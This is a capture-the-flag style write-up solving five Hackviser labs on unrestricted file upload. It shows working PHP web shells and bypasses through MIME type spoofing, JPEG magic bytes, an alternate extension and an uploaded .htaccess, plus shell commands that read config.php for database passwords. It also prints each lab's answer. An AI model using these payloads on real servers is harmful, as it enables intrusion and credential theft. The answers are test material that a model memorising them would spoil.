---
title: 'Unrestricted File Upload'
date: '2026-03-01'
excerpt: 'Practice Unrestricted File Upload attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Unrestricted File Upload</h1>
<div class="writeup-date">April 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice unrestricted file upload attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Basic Unrestricted File Upload</strong></h5>
<p class="mb-3">This lab contains a Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server. To complete the lab, upload a malicious PHP script and read the "config.php" file. What is the database password in the config.php file?</p>
<p class="mb-3">We will create a simple PHP web shell using the following code and upload it.</p>

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image1.png" alt="Web Application Security Unrestricted File Upload 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Once uploaded, click on the file path shown and enter the command <code>pwd</code>. The results should show <code>/var/www/html/uploads</code>. Since HTTP is stateless, everytime we send a commmand through a basic PHP web shell, it starts a brand-new process from scratch. This is why we need to use <code>cd .. && ls</code> to execute both commands within the same shell session. The output is seen below.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image2.png" alt="Web Application Security Unrestricted File Upload 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now that we have confirmed where the config.php file is located, we can run the command <code>cat ../config.php</code>. Browsers try to render the <code>&lt;?php</code> as invisible HTML tags which hides the content. Viewing the page source in a new tab solves this problem.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image3.png" alt="Web Application Security Unrestricted File Upload 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> 8jv77mvXwR7LVU5v</p>
<br />

<h5 class="mb-2"><strong>2. MIME Type Filter Bypass</strong></h5>
<p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the Mime-Type. To complete the lab, upload a malicious PHP script by changing the Mime-Type and read the "config.php" file. What is the database password in the config.php file?</p>
<p class="mb-3">We will create a simple PHP web shell using the following:</p>

```PHP
<?php system($_GET['cmd']); ?>
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image4.png" alt="Web Application Security Unrestricted File Upload 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We choose the webshell.php as the file, enable proxy in BurpSuite to intercept the request, and click Upload.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image5.png" alt="Web Application Security Unrestricted File Upload 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Notice the HTTP POST Request. We change <code>Content-Type: application/octet-stream</code> to <code>Content-Type: image/jpeg</code>.</p>

```HTTP
------WebKitFormBoundarygE19LYt70KMqcH4G
Content-Disposition: form-data; name="input_image"; filename="webshell.php"
Content-Type: image/jpeg
```

<p class="mb-3">Once we forward the HTTP POST Request, we access the URL of the successfully uploaded file.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image6.png" alt="Web Application Security Unrestricted File Upload 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We append <code>?cmd=find / -name "config.php"</code> to the end of the URL and we press Enter.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image7.png" alt="Web Application Security Unrestricted File Upload 7" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now to get the database password, we append <code>?cmd=grep password /var/www/html/config.php</code> to the end of the URL and press Enter.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image8.png" alt="Web Application Security Unrestricted File Upload 8" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> fRqs3s79mQxv6XVt</p>
<br />

<h5 class="mb-2"><strong>3. File Signature Filter Bypass</strong></h5>
<p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file signature (a.k.a magic bytes). To complete the lab, upload a malicious PHP script by manipulating the file signature and read the "config.php" file. What is the database password in the config.php file?</p>
<p class="mb-3">In a Linux terminal, run the following commands to create a webshell:</p>

```Bash
user@linux:~$ printf "\xFF\xD8\xFF<?php system(\$_GET['cmd']); ?>" > webshell.php
user@linux:~$ file webshell.php
webshell.php: JPEG image data
```

<p class="mb-3">Then upload the webshell. It should mention that the file upload is successful.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image9.png" alt="Web Application Security Unrestricted File Upload 9" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Accessing the URL of the uploaded file shows the following:</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image10.png" alt="Web Application Security Unrestricted File Upload 10" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Appending <code>?cmd=grep password /var/www/html/config.php</code> to the end of the URL and pressing Enter reveals the password.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image11.png" alt="Web Application Security Unrestricted File Upload 11" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> 2xESbdzvegfahykF</p>
<br />

<h5 class="mb-2"><strong>4. File Extension Filter Bypass</strong></h5>
<p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Many file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</p>
<p class="mb-3">We create a webshell with extension <code>.phtml</code> with the following payload:</p>

```PHP
<?php system($_GET['cmd']); ?>
```

<p class="mb-3">Uploading the webshell should be successful.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image12.png" alt="Web Application Security Unrestricted File Upload 12" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">When we access the URL of the uploaded webshell, we see the following:</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image13.png" alt="Web Application Security Unrestricted File Upload 13" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To obtain the password, we append <code>?cmd=grep password /var/www/html/config.php</code> to the end of the uploaded webshell URL.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image14.png" alt="Web Application Security Unrestricted File Upload 14" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Qr3eydwjjZmPpwVm</p>
<br />

<h5 class="mb-2"><strong>5. File Extension Improved Filter Bypass</strong></h5>
<p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Almost all file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</p>
<p class="mb-3">We create a file named webshell.php.cyber using the following payload:</p>

```PHP
<?php system($_GET['cmd']); ?>
```

<p class="mb-3">In the browser, we select the file webshell.php.cyber as the file to be uploaded, enable Burp Suite Intercept mode, and click Upload. Then we return to Burp Suite and modify the HTTP POST request as the following:</p>

```HTTP
------WebKitFormBoundaryt21MB0GnocwUNSXD
Content-Disposition: form-data; name="input_image"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .cyber
``` 

<p class="mb-3">The idea is to rename the file to <code>.htaccess</code>, and add the <code>AddType application/x-httpd-php .cyber</code> line in the request.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image15.png" alt="Web Application Security Unrestricted File Upload 15" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Then we forward the request and turn off the Intercept. We should see that the upload is successful and the file name is shown as '.htaccess' in the browser.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image16.png" alt="Web Application Security Unrestricted File Upload 16" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To obtain the password of the database, we navigate to the URL of the uploaded file. But this will make us try to read the .htaccess file which will return HTTP 403 Forbidden. To access our webshell and execute commands, we need to replace <code>/.htaccess</code> to <code>/webshell.php.cyber?cmd=grep password /var/www/html/config.php</code> via the URL.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image17.png" alt="Web Application Security Unrestricted File Upload 17" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> T9n3j6EnMRy2gPAC</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">April 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>